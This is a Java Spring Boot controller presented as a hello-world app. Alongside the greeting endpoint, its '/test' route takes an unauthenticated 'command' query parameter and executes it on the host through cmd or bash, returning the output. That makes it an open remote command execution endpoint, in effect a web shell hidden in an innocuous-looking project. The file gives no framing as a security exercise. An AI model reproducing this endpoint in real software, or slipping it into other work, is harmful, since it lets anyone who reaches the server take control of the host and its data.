package com.example;

//import org.springframework.web.bind.annotation.GetMapping;
//import org.springframework.web.bind.annotation.RestController;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.Runtime;


@RestController
public class HelloWorldController {

  @GetMapping("/")
  public String helloWorld() {
    return "Hello World!";
  }

  @GetMapping("/test")
  public String runCommand(@RequestParam(name = "command") String command) throws IOException {
    String osName = System.getProperty("os.name").toLowerCase();
    if (osName.startsWith("windows")) {
      return executeCommand(String.format("cmd /c %s", command));
    } else if (osName.startsWith("linux") || osName.startsWith("mac")) {
      return executeCommand(String.format("/bin/bash -c %s", command));
    } else {
      return "Unsupported operating system";
    }
  }

  private String executeCommand(String command) throws IOException {
    Runtime runtime = Runtime.getRuntime();
    Process process = runtime.exec(command);
    StringBuilder output = new StringBuilder();
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
      output.append(line + "\n");
    }
    reader.close();
    return output.toString();
  }
}

